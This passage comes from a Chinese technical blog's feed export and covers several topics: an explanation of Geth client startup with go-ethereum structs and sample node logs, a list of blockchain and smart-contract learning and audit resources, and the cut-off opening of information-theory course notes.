downloaded</span></span><br><span class="line">HealedTrienodeBytes <span class="type">uint64</span> <span class="comment">// Number of state trie bytes persisted to disk</span></span><br><span class="line">HealedBytecodes     <span class="type">uint64</span> <span class="comment">// Number of bytecodes downloaded</span></span><br><span class="line">HealedBytecodeBytes <span class="type">uint64</span> <span class="comment">// Number of bytecodes persisted to disk</span></span><br><span class="line"></span><br><span class="line">HealingTrienodes <span class="type">uint64</span> <span class="comment">// Number of state trie nodes pending</span></span><br><span class="line">HealingBytecode  <span class="type">uint64</span> <span class="comment">// Number of bytecodes pending</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Regarding the protocol stack, it’s represented by the <code>Node</code> structure, which comprises numerous fields. Among these, the <code>stop</code> field plays a pivotal role as it signals the termination of the server.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Node is a container on which services can be registered.</span></span><br><span class="line"><span class="keyword">type</span> Node <span class="keyword">struct</span> &#123;</span><br><span class="line">eventmux      *event.TypeMux</span><br><span class="line">config        *Config</span><br><span class="line">accman        *accounts.Manager</span><br><span class="line">log           log.Logger</span><br><span class="line">keyDir        <span class="type">string</span>        <span class="comment">// key store directory</span></span><br><span class="line">keyDirTemp    <span class="type">bool</span>          <span class="comment">// If true, key directory will be removed by Stop</span></span><br><span class="line">dirLock       *flock.Flock  <span class="comment">// prevents concurrent use of instance directory</span></span><br><span class="line">stop          <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125; <span class="comment">// Channel to wait for termination notifications</span></span><br><span class="line">server        *p2p.Server   <span class="comment">// Currently running P2P networking layer</span></span><br><span class="line">startStopLock sync.Mutex    <span class="comment">// Start/Stop are protected by an additional lock</span></span><br><span class="line">state         <span class="type">int</span>           <span class="comment">// Tracks state of node lifecycle</span></span><br><span class="line"></span><br><span class="line">lock          sync.Mutex</span><br><span class="line">lifecycles    []Lifecycle <span class="comment">// All registered backends, services, and auxiliary services that have a lifecycle</span></span><br><span class="line">rpcAPIs       []rpc.API   <span class="comment">// List of APIs currently provided by the node</span></span><br><span class="line">http          *httpServer <span class="comment">//</span></span><br><span class="line">ws            *httpServer <span class="comment">//</span></span><br><span class="line">httpAuth      *httpServer <span class="comment">//</span></span><br><span class="line">wsAuth        *httpServer <span class="comment">//</span></span><br><span class="line">ipc           *ipcServer  <span class="comment">// Stores information about the ipc http server</span></span><br><span class="line">inprocHandler *rpc.Server <span class="comment">// In-process RPC request handler to process the API requests</span></span><br><span class="line"></span><br><span class="line">databases <span class="keyword">map</span>[*closeTrackingDB]<span class="keyword">struct</span>&#123;&#125; <span class="comment">// All open databases</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Once all configurations are in place and prior to the server’s actual launch, you should observe the following output:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">INFO [09-13|12:46:39.391] Starting Geth on Ethereum mainnet...</span><br><span class="line">INFO [09-13|12:46:39.392] Bumping default cache on mainnet         provided=1024 updated=4096</span><br><span class="line">INFO [09-13|12:46:39.396] Maximum peer count                       ETH=50 LES=0 total=50</span><br><span class="line">INFO [09-13|12:46:39.400] Smartcard socket not found, disabling    err=&quot;stat /run/pcscd/pcscd.comm: no such file or directory&quot;</span><br><span class="line">INFO [09-13|12:46:39.408] Set global gas cap                       cap=50,000,000</span><br><span class="line">INFO [09-13|12:46:39.408] Initializing the KZG library             backend=gokzg</span><br><span class="line">INFO [09-13|12:46:39.611] Allocated trie memory caches             clean=614.00MiB dirty=1024.00MiB</span><br><span class="line">INFO [09-13|12:46:39.611] Using pebble as the backing database</span><br><span class="line">INFO [09-13|12:46:39.611] Allocated cache and file handles         database=/home/username/.ethereum/geth/chaindata cache=2.00GiB handles=32767</span><br><span class="line">INFO [09-13|12:46:39.677] Opened ancient database                  database=/home/username/.ethereum/geth/chaindata/ancient/chain readonly=false</span><br><span class="line">INFO [09-13|12:46:39.681] Initialising Ethereum protocol           network=1 dbversion=8</span><br><span class="line">INFO [09-13|12:46:39.681]</span><br><span class="line">INFO [09-13|12:46:39.681] ---------------------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">INFO [09-13|12:46:39.683] Chain ID:  1 (mainnet)</span><br><span class="line">INFO [09-13|12:46:39.683] Consensus: Beacon (proof-of-stake), merged from Ethash (proof-of-work)</span><br><span class="line">INFO [09-13|12:46:39.683]</span><br><span class="line">INFO [09-13|12:46:39.683] Pre-Merge hard forks (block based):</span><br><span class="line">INFO [09-13|12:46:39.683]  - Homestead:                   #1150000  (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/homestead.md)</span><br><span class="line">INFO [09-13|12:46:39.683]  - DAO Fork:                    #1920000  (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/dao-fork.md)</span><br><span class="line">INFO [09-13|12:46:39.683]  - Tangerine Whistle (EIP 150): #2463000  (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/tangerine-whistle.md)</span><br><span class="line">INFO [09-13|12:46:39.683]  - Spurious Dragon/1 (EIP 155): #2675000  (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/spurious-dragon.md)</span><br><span class="line">INFO [09-13|12:46:39.683]  - Spurious Dragon/2 (EIP 158): #2675000  (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/spurious-dragon.md)</span><br><span class="line">INFO [09-13|12:46:39.683]  - Byzantium:                   #4370000  (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/byzantium.md)</span><br><span class="line">INFO [09-13|12:46:39.683]  - Constantinople:              #7280000  (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/constantinople.md)</span><br><span class="line">INFO [09-13|12:46:39.683]  - Petersburg:                  #7280000  (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/petersburg.md)</span><br><span class="line">INFO [09-13|12:46:39.683]  - Istanbul:                    #9069000  (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/istanbul.md)</span><br><span class="line">INFO [09-13|12:46:39.683]  - Muir Glacier:                #9200000  (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/muir-glacier.md)</span><br><span class="line">INFO [09-13|12:46:39.683]  - Berlin:                      #12244000 (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/berlin.md)</span><br><span class="line">INFO [09-13|12:46:39.683]  - London:                      #12965000 (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/london.md)</span><br><span class="line">INFO [09-13|12:46:39.683]  - Arrow Glacier:               #13773000 (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/arrow-glacier.md)</span><br><span class="line">INFO [09-13|12:46:39.683]  - Gray Glacier:                #15050000 (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/gray-glacier.md)</span><br><span class="line">INFO [09-13|12:46:39.683]</span><br><span class="line">INFO [09-13|12:46:39.683] Merge configurationd:</span><br><span class="line">INFO [09-13|12:46:39.683]  - Hard-fork specification:    https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/paris.md</span><br><span class="line">INFO [09-13|12:46:39.683]  - Network known to be merged: true</span><br><span class="line">INFO [09-13|12:46:39.683]  - Total terminal difficulty:  58750000000000000000000</span><br><span class="line">INFO [09-13|12:46:39.683]</span><br><span class="line">INFO [09-13|12:46:39.683] Post-Merge hard forks (timestamp based):</span><br><span class="line">INFO [09-13|12:46:39.684]  - Shanghai:                    @1681338455 (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/shanghai.md)</span><br><span class="line">INFO [09-13|12:46:39.684]</span><br><span class="line">INFO [09-13|12:46:39.684] ---------------------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">INFO [09-13|12:46:39.684]</span><br><span class="line">INFO [09-13|12:46:39.686] Loaded most recent local block           number=0 hash=d4e567..cb8fa3 td=17,179,869,184 age=54y5mo3w</span><br><span class="line">WARN [09-13|12:46:39.688] Loaded snapshot journal                  diffs=missing</span><br><span class="line">INFO [09-13|12:46:39.688] Resuming state snapshot generation       root=d7f897..0f0544 accounts=0 slots=0 storage=0.00B dangling=0 elapsed=&quot;34.181µs&quot;</span><br><span class="line">INFO [09-13|12:46:39.688] Loaded local transaction journal         transactions=0 dropped=0</span><br><span class="line">INFO [09-13|12:46:39.689] Regenerated local transaction journal    transactions=0 accounts=0</span><br><span class="line">INFO [09-13|12:46:39.729] Chain post-merge, sync via beacon client</span><br><span class="line">INFO [09-13|12:46:39.730] Gasprice oracle is ignoring threshold set threshold=2</span><br><span class="line">WARN [09-13|12:46:39.738] Unclean shutdown detected                booted=2023-09-12T15:07:35+0000 age=21h39m4s</span><br><span class="line">WARN [09-13|12:46:39.738] Unclean shutdown detected                booted=2023-09-13T08:02:05+0000 age=4h44m34s</span><br><span class="line">WARN [09-13|12:46:39.739] Engine API enabled                       protocol=eth</span><br></pre></td></tr></table></figure><p>Following this, the <code>startNode</code> function executes, paving the way for <code>StartNode</code>, which is responsible for actually initiating the server. The method <code>stack.Start()</code> found in <code>cmd/utils/cmd.go:72</code> will launch the node. Once the server is up and running, the Geth client keeps tabs on the disk space and monitors system signals to determine when to terminate the server.</p><p>Within the <code>Start()</code> method, the line <code>err := n.openEndpoints()</code> is responsible to open networking and RPC endpoint. Meanwhile, the <code>n.server.Start()</code> method, located at <code>node/node.go:269</code> initiates the p2p discovery and handshake processes. Concurrently, the line <code>err := n.startRPC()</code> located at <code>node/node.go:273</code> brings the RPC endpoint to life. The output should resemble the following:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">INFO [09-13|13:56:00.514] Starting peer-to-peer node               instance=Geth/v1.12.1-unstable-60ce4e8d-20230810/linux-amd64/go1.20.6</span><br><span class="line">INFO [09-13|13:56:04.989] New local node record                    seq=1,694,613,193,948 id=72f98ebcedb92640 ip=127.0.0.1 udp=35555 tcp=35555</span><br><span class="line">INFO [09-13|13:56:05.083] Started P2P networking                   self=enode://9fc6b61a19d99e8a78ae8f8dbd12f27d208ce9b01dd52177fbfee1812a37467b3c3bab49c181b26b240f52bf1ac8afe64915f9b89465a540a74fdcb5e37f2abd@127.0.0.1:35555</span><br><span class="line">INFO [09-13|13:56:05.325] Generating state snapshot                root=d7f897..0f0544 at=9a53a5..ad4ba5 accounts=5375 slots=0 storage=247.62KiB dangling=0 elapsed=8.003s     eta=28.97s</span><br><span class="line">INFO [09-13|13:56:10.187] IPC endpoint opened                      url=/home/username/.ethereum/geth.ipc</span><br><span class="line">INFO [09-13|13:56:10.200] Loaded JWT secret file                   path=/home/username/.ethereum/geth/jwtsecret crc32=0x3392b636</span><br><span class="line">INFO [09-13|13:56:11.116] WebSocket enabled                        url=ws://127.0.0.1:8553</span><br><span class="line">INFO [09-13|13:56:11.121] HTTP server started                      endpoint=127.0.0.1:8553 auth=true prefix= cors=localhost vhosts=localhost</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Once the p2p network layer has been executed successfully, the crucial Ethereum protocol initiates and remains active. Two essential components stand out:</p><ul><li><code>txPool</code>: This manages transactions according to a specified strategy.</li><li><code>blockchain</code>: This encompasses the EVM (Ethereum Virtual Machine) and upholds the chain structure of the blockchain.</li></ul><p>The rationale for defining the subprotocol as a slice of lifecycle is that Geth also supports other protocols layered over the Devp2p protocol.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Ethereum implements the Ethereum full node service.</span></span><br><span class="line"><span class="keyword">type</span> Ethereum <span class="keyword">struct</span> &#123;</span><br><span class="line">config *ethconfig.Config</span><br><span class="line"></span><br><span class="line"><span class="comment">// Handlers</span></span><br><span class="line">txPool *txpool.TxPool</span><br><span class="line"></span><br><span class="line">blockchain         *core.BlockChain</span><br><span class="line">handler            *handler</span><br><span class="line">ethDialCandidates  enode.Iterator</span><br><span class="line">snapDialCandidates enode.Iterator</span><br><span class="line">merger             *consensus.Merger</span><br><span class="line"></span><br><span class="line"><span class="comment">// DB interfaces</span></span><br><span class="line">chainDb ethdb.Database <span class="comment">// Block chain database</span></span><br><span class="line"></span><br><span class="line">eventMux       *event.TypeMux</span><br><span class="line">engine         consensus.Engine</span><br><span class="line">accountManager *accounts.Manager</span><br><span class="line"></span><br><span class="line">bloomRequests     <span class="keyword">chan</span> <span class="keyword">chan</span> *bloombits.Retrieval <span class="comment">// Channel receiving bloom data retrieval requests</span></span><br><span class="line">bloomIndexer      *core.ChainIndexer             <span class="comment">// Bloom indexer operating during block imports</span></span><br><span class="line">closeBloomHandler <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">APIBackend *EthAPIBackend</span><br><span class="line"></span><br><span class="line">miner     *miner.Miner</span><br><span class="line">gasPrice  *big.Int</span><br><span class="line">etherbase common.Address</span><br><span class="line"></span><br><span class="line">networkID     <span class="type">uint64</span></span><br><span class="line">netRPCService *ethapi.NetAPI</span><br><span class="line"></span><br><span class="line">p2pServer *p2p.Server</span><br><span class="line"></span><br><span class="line">lock sync.RWMutex <span class="comment">// Protects the variadic fields (e.g. gas price and etherbase)</span></span><br><span class="line"></span><br><span class="line">shutdownTracker *shutdowncheck.ShutdownTracker <span class="comment">// Tracks if and when the node has shutdown ungracefully</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To summarize, the steps for starting a Geth client are as follows:</p><ol><li><strong>Command Line Parsing</strong>: The parser breaks down flags, subcommands, or the configuration file into a <code>context</code>.</li><li><strong>Process Context</strong>: The command line context is processed, establishing memory cache allowances and, if enabled, metrics that monitor the runtime environment.</li><li><strong>Protocol Stack Assembly</strong>: Based on the provided configuration, the protocol stack is assembled into a node struct. Concurrently, interaction methods are incorporated into <code>ethapi.Backend</code>.</li><li>Node Initialization:<ol><li><strong>P2P Network Layer</strong>: Initiates the p2p network layer for node discovery and facilitates basic pre-subprotocol (devp2p) message exchange.</li><li><strong>RPC Endpoint</strong>: This step starts the RPC endpoint.</li><li><strong>Subprotocols Activation</strong>: All the specified subprotocols in the lifecycles of the local node are initiated.</li><li><strong>Monitoring</strong>: Upon successful initialization, the system begins monitoring disk space and awaits system signals for termination.</li></ol></li></ol>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/geth/tx-signature/&quot; title=&quot;交易的签名&quot;&gt;交易的签名&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-receipt/&quot; title=&quot;理解收据receipt&quot;&gt;理解收据receipt&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blocks/&quot; title=&quot;理解区块&quot;&gt;理解区块&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-tx/&quot; title=&quot;理解交易&quot;&gt;理解交易&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blockchain-core/&quot; title=&quot;blockchain核心&quot;&gt;blockchain核心&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/forkId/&quot; title=&quot;forkId 解读&quot;&gt;forkId 解读&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/bloom-filter/&quot; title=&quot;布隆过滤器原理&quot;&gt;布隆过滤器原理&lt;/a&gt;&lt;</summary>
        
      
    
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/categories/geth/"/>
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/tags/geth/"/>
    
  </entry>
  
  <entry>
    <title>区块链相关学习材料</title>
    <link href="https://www.blog-blockchain.xyz/audit/blockchian-study-material/"/>
    <id>https://www.blog-blockchain.xyz/audit/blockchian-study-material/</id>
    <published>2023-08-09T09:33:33.000Z</published>
    <updated>2024-11-18T09:48:31.318Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/audit/classic-vulnerabilities/" title="智能合约的经典漏洞">智能合约的经典漏洞</a></li><li><a href="/audit/open-source-audit-tools/" title="智能合约的审计工具">智能合约的审计工具</a></li><li><a href="/audit/smart-contract-learning-path/" title="智能合约安全学习路线">智能合约安全学习路线</a></li><li><a href="/audit/learning-resource/" title="智能合约学习资源">智能合约学习资源</a></li><li><a href="/audit/blockchian-study-material/" title="区块链相关学习材料">区块链相关学习材料</a></li></ol></blockquote><p>一些不错的合约相关入门资料。我已经过了这个阶段了，这些书签都要删了，就分享出来。<br><a href="https://github.com/bkrem/awesome-solidity">https://github.com/bkrem/awesome-solidity</a><br><a href="https://learnblockchain.cn/article/2383">https://learnblockchain.cn/article/2383</a><br><a href="https://learnblockchain.cn/column/1">https://learnblockchain.cn/column/1</a><br><a href="https://learnblockchain.cn/eth/">https://learnblockchain.cn/eth/</a><br><a href="https://solidity-by-example.org/">https://solidity-by-example.org/</a><br><a href="https://goethereumbook.org/zh/">https://goethereumbook.org/zh/</a></p><p>流行的生态：<br><a href="https://openzeppelin.com/">https://openzeppelin.com/</a><br><a href="https://www.trufflesuite.com/">https://www.trufflesuite.com/</a><br><a href="https://infura.io/dashboard">https://infura.io/dashboard</a></p><p>一些博客：<br><a href="https://hackmd.io/@Nhlanhla">https://hackmd.io/@Nhlanhla</a><br><a href="https://github.com/blockchainGuide/blockchainguide">https://github.com/blockchainGuide/blockchainguide</a><br><a href="https://u.naturaldao.io/be/">https://u.naturaldao.io/be/</a><br><a href="https://blog.wongssh.cf/">https://blog.wongssh.cf/</a><br><a href="https://www.tofreedom.me/">https://www.tofreedom.me/</a><br><a href="https://blog.wongssh.cf/">https://blog.wongssh.cf/</a></p><p>EVM 字节码和源码相关:<br><a href="https://ethbook.abyteahead.com/index.html">https://ethbook.abyteahead.com/index.html</a><br><a href="https://www.youtube.com/watch?v=RxL_1AfV7N4&amp;t=1s">https://www.youtube.com/watch?v=RxL_1AfV7N4&amp;t=1s</a><br><a href="https://github.com/palkeo/panoramix">https://github.com/palkeo/panoramix</a><br><a href="https://www.yaofeiliang.com/tags/#%E5%8C%BA%E5%9D%97%E9%93%BE">https://www.yaofeiliang.com/tags/#区块链</a><br><a href="https://github.com/ZtesoftCS/go-ethereum-code-analysis">https://github.com/ZtesoftCS/go-ethereum-code-analysis</a><br><a href="https://learnblockchain.cn/books/geth/">https://learnblockchain.cn/books/geth/</a></p><p>问答社区：<br><a href="https://gitter.im/ethereum/home">https://gitter.im/ethereum/home</a><br><a href="https://stackoverflow.com/">https://stackoverflow.com/</a><br><a href="https://forum.openzeppelin.com/c/general/16">https://forum.openzeppelin.com/c/general/16</a></p><p>代码分析：<br><a href="https://blog.csdn.net/zhang971105/article/details/109046458">https://blog.csdn.net/zhang971105/article/details/109046458</a><br><a href="https://xiongyingfei.github.io/SA/2022/main.htm">https://xiongyingfei.github.io/SA/2022/main.htm</a><br><a href="https://pascal-group.bitbucket.io/teaching.html">https://pascal-group.bitbucket.io/teaching.html</a><br><a href="https://www.cs.cmu.edu/~aldrich/courses/17-355-19sp/">https://www.cs.cmu.edu/~aldrich/courses/17-355-19sp/</a></p><p>安全事件和赏金：<br><a href="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzU4ODQ3NTM2OA==&amp;action=getalbum&amp;album_id=1378653641065857025">https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzU4ODQ3NTM2OA==&amp;action=getalbum&amp;album_id=1378653641065857025</a><br><a href="https://immunefi.com/">https://immunefi.com/</a><br><a href="https://rekt.news/zh/">https://rekt.news/zh/</a></p><p>积极维护的开源审计工具：<br><a href="https://github.com/crytic/slither">https://github.com/crytic/slither</a><br><a href="https://github.com/ConsenSys/mythril">https://github.com/ConsenSys/mythril</a><br><a href="https://github.com/trailofbits/manticore">https://github.com/trailofbits/manticore</a><br><a href="https://github.com/sc-forks/solidity-coverage">https://github.com/sc-forks/solidity-coverage</a><br><a href="https://github.com/crytic/echidna">https://github.com/crytic/echidna</a></p><p>反汇编工具：<br><a href="https://library.dedaub.com/">https://library.dedaub.com/</a><br><a href="https://www.pnfsoftware.com/jeb/manual/ethereum/">https://www.pnfsoftware.com/jeb/manual/ethereum/</a><br><a href="https://ethervm.io/decompile">https://ethervm.io/decompile</a></p><p>区块链数据库：<br><a href="https://bitquery.io/">https://bitquery.io/</a><br><a href="https://github.com/tintinweb/smart-contract-sanctuary-ethereum">https://github.com/tintinweb/smart-contract-sanctuary-ethereum</a><br><a href="https://xblock.pro/#/">https://xblock.pro/#/</a></p><p>defi 课程和书：<br><a href="https://www.coursera.org/specializations/decentralized-finance-duke">https://www.coursera.org/specializations/decentralized-finance-duke</a><br><a href="https://y1cunhui.github.io/uniswapV3-book-zh-cn/">https://y1cunhui.github.io/uniswapV3-book-zh-cn/</a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/audit/classic-vulnerabilities/&quot; title=&quot;智能合约的经典漏洞&quot;&gt;智能合约的经典漏洞&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/audit/open-source-audit-tools/&quot; title=&quot;智能合约的审计工具&quot;&gt;智能合约的审计工具&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/audit/smart-contract-learning-path/&quot; title=&quot;智能合约安全学习路线&quot;&gt;智能合约安全学习路线&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/audit/learning-resource/&quot; title=&quot;智能合约学习资源&quot;&gt;智能合约学习资源&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/audit/blockchian-study-material/&quot; title=&quot;区块链相关学习材料&quot;&gt;区块链相关学习材料&lt;/a&gt;&lt;/li&gt;&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;一些不错的合约相关入门资料</summary>
        
      
    
    
    
    <category term="audit" scheme="https://www.blog-blockchain.xyz/categories/audit/"/>
    
    
    <category term="smart contract" scheme="https://www.blog-blockchain.xyz/tags/smart-contract/"/>
    
  </entry>
  
  <entry>
    <title>信息论与编码</title>
    <link href="https://www.blog-blockchain.xyz/cs-courses/information-theory/"/>
    <id>https://www.blog-blockchain.xyz/cs-courses/information-theory/</id>
    <published>2023-05-29T00:15:22.000Z</published>
    <updated>2024-11-15T14:30:54.919Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/cs-courses/C-language-basis/" title="C语言基础">C语言基础</a></li><li><a href="/cs-courses/modular-inverses/" title="乘法逆元">乘法逆元</a></li><li><a href="/cs-courses/cpp-cryptographic-algorithm-basis/" title="信息安全算法基础">信息安全算法基础</a></li><li><a href="/cs-courses/OS/" title="操作系统基础">操作系统基础</a></li><li><a href="/cs-courses/x86-masm/" title="x86汇编基础">x86汇编基础</a></li><li><a href="/cs-courses/information-theory/" title="信息论与编码">信息论与编码</a></li></ol></blockquote><h1>前言</h1><p>这篇总结和系统性学习地笔记，是基于电子科技大学的《信息论与编码》课程，而我写作的初衷是个人的复习。因此，内容可能不是那么详细，但是我会保证基本上我会在自己理解的基础上，完成这篇文章。随着我自己的理解的加深，可能会出现前后不一致的情况，如果读者感到矛盾，那么请在评论区说明，等我有时间时会继续完善的。</p><h1>离散信源熵</h1><p>单符号离散信源是最简单的情况，离散是指信源输出是有限个符号，单符号是指每个符号都是独立的，每次只发出一个符号。</p><h2 id="随机变量基础">随机变量基础</h2><p>在单符号离散信源中，每个符号的概率分布可以用一个概率向量来表示。例如，一个三个符号的单符号离散信源可以用以下概率分布表示，符号 A、B、C 之间是相互独立的，即一个符号的出现不会影响到其他符号的出现概率。可以如下的方式抽象成数学模型。</p><p>离散随机变量集合：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">{a_1,a_2,a_3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span>，对应概率 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(a_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span 